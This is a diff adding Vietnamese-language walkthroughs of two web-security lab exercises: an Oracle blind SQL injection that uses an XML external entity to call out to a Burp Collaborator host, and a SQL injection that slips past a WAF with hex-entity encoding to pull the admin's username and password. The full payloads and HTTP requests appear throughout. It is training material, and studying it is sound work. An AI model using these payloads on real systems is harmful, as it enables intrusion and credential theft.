@@ -820,5 +820,172 @@ Cookie: TrackingId=abc'%3bSELECT+CASE+WHEN+(SUBSTRING(password,$1$,1)='$a$')+THE
 - Vị trí `2 - a` chọn `Brute forcer` Min length = Max Length = 1
 - Start attack, ghép lại password theo thứ tự
 
+### Lab: Blind SQL injection with out-of-band interaction
+> Khai thác lỗ hổng SQL dấn đến `DNS lookup` tới **Burp Collaborator**
+
+Phòng thí nghiệm này chứa lỗ hổng SQL mù. Ứng dụng sử dụng `cookie` theo dõi để phân tích và thực hiện truy vấn SQL chứa giá trị của `cookie` đã gửi.
+
+Truy vấn SQL được thực thi không đồng bộ và không có tác dụng đối với phản hồi của ứng dụng. Tuy nhiên, bạn có thể kích hoạt các tương tác ngoài băng tần với một miền bên ngoài.
+
+Payload:
+```
+'||(SELECT EXTRACTVALUE(
+    xmltype('<?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE root [
+        <!ENTITY % remote SYSTEM "http://8bk069g0qvpde4gevf9ggocxyo4fs5gu.oastify.com/">
+        %remote;
+    ]>'),
+    '/l'
+) FROM dual--
+```
+
+- Không thể sử dụng các kĩ thuật như `Time Base SQLi`, ta cần gửi nó ra 1 kênh bên ngoài.
+- `xmltype(...)`: Hàm Oracle để tạo một đối tượng XML từ một chuỗi văn bản.
+- `EXTRACTVALUE(xml, xpath)`: Truy vấn giá trị trong XML bằng biểu thức XPath. Ở đây là /l, nhưng giá trị này không quan trọng — mục tiêu chính là kích hoạt parser XML.
+- Phần XML chứa khai báo DOCTYPE với một entity bên ngoài:
+    - %remote; là parameter entity – Oracle’s XML parser sẽ fetch nội dung từ URL được khai báo (out-of-band) và chèn nó vào tài liệu XML.
+    - Điều này kích hoạt request HTTP ra ngoài, giúp attacker kiểm tra xem ứng dụng có phân tích cú pháp DTD và hỗ trợ entity bên ngoài không.
+
+Request:
+```http
+GET / HTTP/2
+Host: 0a3d006904b5428180110885008c007a.web-security-academy.net
+Cookie: TrackingId='||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://8bk069g0qvpde4gevf9ggocxyo4fs5gu.oastify.com/"> %remote;]>'),'/l') FROM dual)--; session=ZdNfyoJrDkB9gqxoe4jsB8YV7Fjt1WDm
+```
+
+### Lab: SQL injection with filter bypass via XML encoding
+> Mục tiêu: Thực hiện một cuộc tấn công tiêm SQL để truy xuất thông tin đăng nhập của người dùng quản trị viên, sau đó đăng nhập vào tài khoản của họ.
+
+Phòng thí nghiệm này chứa lỗ hổng SQL trong tính năng `check stock`. Kết quả từ truy vấn được trả về trong phản hồi của ứng dụng, vì vậy bạn có thể sử dụng một cuộc tấn công công đoàn để lấy dữ liệu từ các bảng khác.
+
+Cơ sở dữ liệu chứa bảng users, chứa usernames và passwords của người dùng đã đăng ký.
+
+> **Web Application Firewall (WAF)** sẽ chặn các yêu cầu chứa các dấu hiệu rõ ràng của một cuộc tấn công tiêm SQL. Bạn sẽ cần tìm cách làm xáo trộn truy vấn độc hại của bạn để bỏ qua bộ lọc này. Chúng tôi khuyên bạn nên sử dụng tiện ích mở rộng **Hackvertor** để làm điều này.
+{: .prompt-info }
+
+
+#### Check if input is executed
+Request:
+
+```http
+POST /product/stock HTTP/2
+Host: 0ac8001304de748480693f3f005a00b3.web-security-academy.net
+Cookie: session=qGsT44wZyGhSvi3KBqUoMEmDqmluKz7U
+Content-Length: 115
+Content-Type: application/xml
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck>
+    <productId>1</productId>
+    <storeId>1 + 1</storeId>
+</stockCheck>
+```
+Xuất hiện số unit khác với 1 ban đầu, cho thấy cho thể thực thi.
+
+#### Bypass WAF using XML Entities Encoding
+Request:
+```http
+POST /product/stock HTTP/2
+Host: 0ac8001304de748480693f3f005a00b3.web-security-academy.net
+Cookie: session=qGsT44wZyGhSvi3KBqUoMEmDqmluKz7U
+Content-Length: 115
+Content-Type: application/xml
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck>
+    <productId>1</productId>
+    <storeId>1 UNION SELECT NULL</storeId>
+</stockCheck>
+```
+Xuất hiện `"Attack detected"` do đã bị **WAF filter**.
+
+> Giải pháp: Dùng mã hóa XML entities để biến payload thành dạng mà WAF khó nhận diện
+
+Dùng công cụ **Hackverter** để mã hóa XML entities, vào **BApp** tìm và tải **Hackverter**.
+
+- Tìm tên của người dùng `admin`
+Payload:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck>
+    <productId>1</productId>
+    <storeId>1 UNION SELECT username FROM users</storeId>
+</stockCheck>
+```
+
+- Bôi đen phần `1 UNION SELECT username FROM users` > Chuột phải > Extensions > Hackverter > Encode > Hex entities
+
+Request:
+```http
+POST /product/stock HTTP/2
+Host: 0ac8001304de748480693f3f005a00b3.web-security-academy.net
+Cookie: session=qGsT44wZyGhSvi3KBqUoMEmDqmluKz7U
+Content-Length: 115
+Content-Type: application/xml
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck>
+    <productId>1</productId>
+    <storeId>
+        <@hex_entities>
+            1 UNION SELECT username FROM users
+        </@hex_entities>
+    </storeId>
+</stockCheck>
+```
+
+Tiếp tục `request` để tìm `password` của `admin`
+
+Request:
+```http
+POST /product/stock HTTP/2
+Host: 0ac8001304de748480693f3f005a00b3.web-security-academy.net
+Cookie: session=qGsT44wZyGhSvi3KBqUoMEmDqmluKz7U
+Content-Length: 115
+Content-Type: application/xml
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck>
+    <productId>1</productId>
+    <storeId>
+        <@hex_entities>
+            1 UNION SELECT password FROM users where username = 'administrator'
+        </@hex_entities>
+    </storeId>
+</stockCheck>
+```
+
+Có thể sử dụng `payload` gọn hơn bằng phép nối `||`
+
+Request:
+```http
+POST /product/stock HTTP/2
+Host: 0ac8001304de748480693f3f005a00b3.web-security-academy.net
+Cookie: session=qGsT44wZyGhSvi3KBqUoMEmDqmluKz7U
+Content-Length: 115
+Content-Type: application/xml
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck>
+    <productId>1</productId>
+    <storeId>
+        <@hex_entities>
+            1 UNION SELECT username || '~' || password FROM users
+        </@hex_entities>
+    </storeId>
+</stockCheck>
+```
+Nối username và password theo từng cặp, tách nhau bởi `'~'`
+
 ---
 Goodluck! 🍀🍀🍀
